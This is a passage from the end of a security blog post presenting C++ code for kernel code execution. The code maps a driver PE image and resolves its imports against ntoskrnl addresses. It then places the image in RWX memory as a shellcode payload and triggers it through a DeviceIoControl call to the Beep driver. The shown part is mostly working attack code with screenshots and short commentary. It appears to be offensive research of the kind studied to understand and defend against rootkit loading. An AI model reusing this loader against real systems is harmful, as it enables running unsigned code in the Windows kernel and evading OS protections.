</span></span><span class=line><span class=cl>		<span class=n>name</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>memcpy</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>sectionHeader</span><span class=o>-&gt;</span><span class=n>Name</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Mapping Section %s (Fileoffset %x to VA %x-%x)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>sectionHeader</span><span class=o>-&gt;</span><span class=n>PointerToRawData</span><span class=p>,</span> <span class=n>sectionHeader</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>,</span> <span class=p>(</span><span class=n>uintptr_t</span><span class=p>)</span><span class=n>sectionHeader</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span> <span class=o>+</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] ------------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Resolving Imports of Driver PE File</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// resolve the imports
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>IMAGE_DATA_DIRECTORY</span><span class=o>*</span> <span class=n>imports</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>pe</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] imports dir = 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>imports</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] imports dir va = 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>imports</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>imports</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>IMAGE_IMPORT_DESCRIPTOR</span><span class=o>*</span> <span class=n>importDescriptor</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_IMPORT_DESCRIPTOR</span><span class=o>*</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>pPeMapping</span> <span class=o>+</span> <span class=n>imports</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=k>while</span> <span class=p>(</span><span class=n>TRUE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>importDescriptor</span><span class=o>-&gt;</span><span class=n>Characteristics</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=n>PSTR</span> <span class=n>moduleName</span> <span class=o>=</span> <span class=p>(</span><span class=n>PSTR</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>pPeMapping</span> <span class=o>+</span> <span class=n>importDescriptor</span><span class=o>-&gt;</span><span class=n>Name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] imports for %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>moduleName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=n>HMODULE</span> <span class=n>hModule</span> <span class=o>=</span> <span class=n>GetModuleHandleA</span><span class=p>(</span><span class=n>moduleName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>hModule</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>hModule</span> <span class=o>=</span> <span class=n>LoadLibraryExA</span><span class=p>(</span><span class=n>moduleName</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>DONT_RESOLVE_DLL_REFERENCES</span> <span class=o>|</span> <span class=n>LOAD_LIBRARY_SEARCH_DEFAULT_DIRS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>hModule</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;failed to map %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>moduleName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=n>IMAGE_THUNK_DATA</span><span class=o>*</span> <span class=n>importLookupTable</span> <span class=o>=</span> <span class=p>(</span><span class=n>PIMAGE_THUNK_DATA</span><span class=p>)((</span><span class=n>uintptr_t</span><span class=p>)</span><span class=n>pPeMapping</span> <span class=o>+</span> <span class=n>importDescriptor</span><span class=o>-&gt;</span><span class=n>OriginalFirstThunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=kt>void</span><span class=o>**</span> <span class=n>iat</span> <span class=o>=</span> <span class=p>(</span><span class=n>PVOID</span><span class=o>*</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>pPeMapping</span> <span class=o>+</span> <span class=n>importDescriptor</span><span class=o>-&gt;</span><span class=n>FirstThunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] IAT is located at 0x%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>iat</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Copy Function Pointers to Shellcode Driver Mapping:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=c1>// struct _IMAGE_THUNK_DATA64 u1
</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=k>while</span> <span class=p>(</span><span class=n>importLookupTable</span><span class=o>-&gt;</span><span class=n>u1</span><span class=p>.</span><span class=n>AddressOfData</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>BOOL</span> <span class=n>is_by_ordinal</span> <span class=o>=</span> <span class=n>importLookupTable</span><span class=o>-&gt;</span><span class=n>u1</span><span class=p>.</span><span class=n>AddressOfData</span> <span class=o>&gt;&gt;</span> <span class=mi>63</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=p>(</span><span class=n>is_by_ordinal</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;Sorry import by ordinal isnt supportd</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>					<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=n>IMAGE_IMPORT_BY_NAME</span><span class=o>*</span> <span class=n>import_name</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_IMPORT_BY_NAME</span><span class=o>*</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>pPeMapping</span> <span class=o>+</span> <span class=n>importLookupTable</span><span class=o>-&gt;</span><span class=n>u1</span><span class=p>.</span><span class=n>AddressOfData</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=n>PSTR</span> <span class=n>sName</span> <span class=o>=</span> <span class=n>import_name</span><span class=o>-&gt;</span><span class=n>Name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>				<span class=n>DWORD64</span> <span class=n>offset</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hModule</span><span class=p>,</span> <span class=n>sName</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>hModule</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s> [V] --&gt; %s = 0x%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>sName</span><span class=p>,</span> <span class=n>g_NtosKrnl</span> <span class=o>+</span> <span class=n>offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=n>DWORD64</span> <span class=n>resolved_import</span> <span class=o>=</span> <span class=n>g_NtosKrnl</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=o>*</span><span class=n>iat</span> <span class=o>=</span> <span class=p>(</span><span class=n>PVOID</span><span class=p>)</span><span class=n>resolved_import</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>				<span class=n>importLookupTable</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=n>iat</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=n>importDescriptor</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] Resolving Imports Success!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] ------------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>SIZE_T</span> <span class=n>szPeMappingSize</span> <span class=o>=</span> <span class=n>pe</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>SizeOfImage</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Size of driver PE Image %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>szPeMappingSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>g_szShellcodeDataSize</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>BeepIRPStruct</span><span class=p>)</span> <span class=o>+</span> <span class=n>szPeMappingSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Full Shellcode Data Size %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>g_szShellcodeDataSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>g_BeepIRPShellcodeData</span> <span class=o>=</span> <span class=p>(</span><span class=n>BeepIRPStruct</span><span class=o>*</span><span class=p>)</span><span class=n>VirtualAlloc</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>g_szShellcodeDataSize</span><span class=p>,</span> <span class=n>MEM_RESERVE</span> <span class=o>|</span> <span class=n>MEM_COMMIT</span><span class=p>,</span> <span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>g_BeepIRPShellcodeData</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[!] VirtualAlloc failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>memcpy</span><span class=p>(</span><span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>bPayload</span><span class=p>,</span> <span class=n>pPeMapping</span><span class=p>,</span> <span class=n>szPeMappingSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>szPayloadSize</span> <span class=o>=</span> <span class=n>szPeMappingSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>//PrintHexData(&#34;pPeMapping:&#34;, pPeMapping, szPeMappingSize);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The following shows the resolving of function pointers and the updated IAT after the modifications:</p><figure class=center><img loading=lazy src=/images/x509.png></figure><p>At offset +0x4000 is the updated IAT with the populated function pointers from above:</p><figure class=center><img loading=lazy src=/images/x510.png></figure><p>Once we have everything set up correctly we call the beep handler:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>VOID</span> <span class=nf>triggerBeepIO</span><span class=p>(</span><span class=n>HANDLE</span> <span class=n>driver</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>out_buf</span><span class=p>[</span><span class=mi>4000</span><span class=p>];</span> <span class=c1>// doesnt really matter
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>DWORD</span> <span class=n>bytes_returned</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Sending Payload With Size 0x%x to Beep</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>g_szShellcodeDataSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>//hexdump(BeepIRPShellcodeData, my_shellcode_data_sz);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>BOOL</span> <span class=n>result</span> <span class=o>=</span> <span class=n>DeviceIoControl</span><span class=p>(</span><span class=n>driver</span><span class=p>,</span> <span class=mh>0x1234</span><span class=p>,</span> <span class=n>g_BeepIRPShellcodeData</span><span class=p>,</span> <span class=n>g_szShellcodeDataSize</span><span class=p>,</span> <span class=n>out_buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>out_buf</span><span class=p>),</span> <span class=o>&amp;</span><span class=n>bytes_returned</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[!] Beep DeviceIOControl error %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] trigger DeviceIoControl Beep returns %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>And our shellcode will execute:</p><figure class=center><img loading=lazy src=/images/x511.png></figure></div><footer class=post-footer></footer><div class=comments-separator></div></article></main><footer class=footer><span>&copy; 2025 <a href=https://cschwarz1.github.io/>home</a></span><span style=display:inline-block;margin-left:1em>
<a href=https://creativecommons.org/licenses/by-sa/4.0/>CC BY-SA</a>
</span><span style=display:inline-block;margin-left:1em>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
    <a href=https://github.com/reorx/hugo-PaperModX/ rel=noopener target=_blank>PaperModX</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>(function(){const t=""=="1";if(t)return;let e=document.getElementById("theme-toggle");e.removeEventListener("click",toggleThemeListener),e.addEventListener("click",toggleThemeListener)})()</script><script>(function(){let e=document.getElementById("menu");e&&(e.scrollLeft=localStorage.getItem("menu-scroll-position"),e.onscroll=function(){localStorage.setItem("menu-scroll-position",e.scrollLeft)});const t=""=="1",n=""=="1";if(window.matchMedia("(prefers-reduced-motion: reduce)").matches||t||n)return;document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})})()</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>if(window.scrollListeners)for(const e of scrollListeners)window.removeEventListener("scroll",e);window.scrollListeners=[]</script><script src=/js/medium-zoom.min.js data-no-instant></script><script>(function(){const a=""=="1";if(!a)return;if(!document.querySelector(".toc")){console.log("no toc found, ignore toc scroll");return}const r=window.scrollListeners,t=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id]"),n="active";let e=t[0];o(e).classList.add(n);const c=()=>{const s=[];for(const e of t)if(l(e)<5)s.push(e);else break;s.length>0?newActiveHeading=s[s.length-1]:newActiveHeading=t[0],e!=newActiveHeading&&(o(e).classList.remove(n),e=newActiveHeading,o(e).classList.add(n))};let s=null;const i=()=>{s!==null&&clearTimeout(s),s=setTimeout(c,50)};window.addEventListener("scroll",i,!1),r.push(i);function o(e){const t=encodeURI(e.getAttribute("id")).toLowerCase();return document.querySelector(`.toc ul li a[href="#${t}"]`)}function l(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect();return t.top}})()</script></body></html>